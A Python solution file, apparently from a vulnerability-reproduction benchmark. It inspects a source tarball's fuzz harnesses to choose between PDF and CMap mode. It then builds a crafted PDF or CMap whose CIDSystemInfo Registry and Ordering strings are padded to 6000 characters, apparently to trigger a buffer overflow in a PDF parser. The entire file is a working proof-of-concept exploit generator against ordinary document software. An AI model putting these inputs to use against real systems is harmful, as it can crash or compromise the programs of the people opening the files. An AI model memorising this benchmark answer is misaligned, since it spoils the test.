import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        mode = "pdf"
        try:
            with tarfile.open(src_path, "r:*") as tar:
                mode = self._detect_mode_from_tar(tar)
        except Exception:
            mode = "pdf"

        if mode == "cmap":
            return self._generate_cmap_poc()
        else:
            return self._generate_pdf_poc()

    def _detect_mode_from_tar(self, tar: tarfile.TarFile) -> str:
        pdf_score = 1  # default bias toward PDF
        cmap_score = 0

        for member in tar.getmembers():
            if not member.isfile():
                continue
            name_lower = member.name.lower()
            if not (
                name_lower.endswith(".c")
                or name_lower.endswith(".cc")
                or name_lower.endswith(".cpp")
                or name_lower.endswith(".cxx")
            ):
                continue
            f = tar.extractfile(member)
            if f is None:
                continue
            try:
                data = f.read()
            finally:
                f.close()
            try:
                text = data.decode("utf-8", errors="ignore")
            except Exception:
                continue

            lower = text.lower()
            if "llvmfuzzertestoninput" not in lower:
                continue

            # Heuristic keyword scoring
            pdf_score += lower.count("pdf")
            pdf_score += lower.count("document")
            pdf_score += lower.count("open_document")
            pdf_score += lower.count("fz_open_document")

            cmap_score += lower.count("cmap")
            cmap_score += lower.count("cidfont")
            cmap_score += lower.count("cidsysteminfo")
            cmap_score += lower.count("cid ")

        if cmap_score > pdf_score:
            return "cmap"
        return "pdf"

    def _generate_cmap_poc(self, registry_len: int = 6000, ordering_len: int = 6000) -> bytes:
        registry = "A" * registry_len
        ordering = "B" * ordering_len

        parts = []
        parts.append("/CIDInit /ProcSet findresource begin\n")
        parts.append("12 dict begin\n")
        parts.append("begincmap\n")
        parts.append(
            "/CIDSystemInfo << /Registry ("
            + registry
            + ") /Ordering ("
            + ordering
            + ") /Supplement 0 >> def\n"
        )
        parts.append("/CMapName /Adobe-Identity-UCS def\n")
        parts.append("/CMapType 2 def\n")
        parts.append("1 begincodespacerange\n")
        parts.append("<0000><FFFF>\n")
        parts.append("endcodespacerange\n")
        parts.append("1 beginbfrange\n")
        parts.append("<0000><FFFF> <0000>\n")
        parts.append("endbfrange\n")
        parts.append("endcmap\n")
        parts.append("CMapName currentdict /CMap defineresource pop\n")
        parts.append("end\n")
        parts.append("end\n")

        cmap_str = "".join(parts)
        return cmap_str.encode("ascii")

    def _generate_pdf_poc(self, registry_len: int = 6000, ordering_len: int = 6000) -> bytes:
        registry = "A" * registry_len
        ordering = "B" * ordering_len

        header = "%PDF-1.4\n"

        # Objects:
        # 1: Catalog
        obj1 = (
            "1 0 obj\n"
            "<< /Type /Catalog /Pages 2 0 R >>\n"
            "endobj\n"
        )

        # 2: Pages
        obj2 = (
            "2 0 obj\n"
            "<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"
            "endobj\n"
        )

        # 3: Page
        obj3 = (
            "3 0 obj\n"
            "<< /Type /Page /Parent 2 0 R "
            "/MediaBox [0 0 612 792] "
            "/Resources << /Font << /F1 4 0 R >> >> "
            "/Contents 6 0 R >>\n"
            "endobj\n"
        )

        # 4: Type0 Font referencing CIDFont 5
        obj4 = (
            "4 0 obj\n"
            "<< /Type /Font /Subtype /Type0 "
            "/BaseFont /F1 "
            "/Encoding /Identity-H "
            "/DescendantFonts [5 0 R] >>\n"
            "endobj\n"
        )

        # 5: CIDFont with oversized CIDSystemInfo strings
        obj5 = (
            "5 0 obj\n"
            "<< /Type /Font /Subtype /CIDFontType2 "
            "/BaseFont /F1 "
            "/CIDSystemInfo << /Registry ("
            + registry
            + ") /Ordering ("
            + ordering
            + ") /Supplement 0 >> "
            "/DW 1000 "
            "/W [ 0 [ 500 ] ] "
            ">>\n"
            "endobj\n"
        )

        # 6: Content stream using font F1
        stream_body = "BT\n/F1 24 Tf\n100 700 Td\n<0001> Tj\nET\n"
        stream_length = len(stream_body.encode("ascii"))
        obj6 = (
            "6 0 obj\n"
            "<< /Length " + str(stream_length) + " >>\n"
            "stream\n"
            + stream_body
            + "endstream\n"
            "endobj\n"
        )

        objs = {
            1: obj1,
            2: obj2,
            3: obj3,
            4: obj4,
            5: obj5,
            6: obj6,
        }

        order = [1, 2, 3, 4, 5, 6]

        header_bytes = header.encode("ascii")
        body_parts = []
        offsets = {}
        pos = len(header_bytes)

        for oid in order:
            s = objs[oid]
            b = s.encode("ascii")
            offsets[oid] = pos
            pos += len(b)
            body_parts.append(b)

        xref_offset = pos

        # Build xref table
        xref_lines = []
        xref_lines.append("xref\n")
        xref_lines.append(f"0 {len(order) + 1}\n")
        xref_lines.append("0000000000 65535 f \n")
        for oid in order:
            xref_lines.append(f"{offsets[oid]:010d} 00000 n \n")
        xref_bytes = "".join(xref_lines).encode("ascii")

        # Trailer
        trailer_str = (
            "trailer\n"
            f"<< /Size {len(order) + 1} /Root 1 0 R >>\n"
            "startxref\n"
            f"{xref_offset}\n"
            "%%EOF\n"
        )
        trailer_bytes = trailer_str.encode("ascii")

        return header_bytes + b"".join(body_parts) + xref_bytes + trailer_bytes
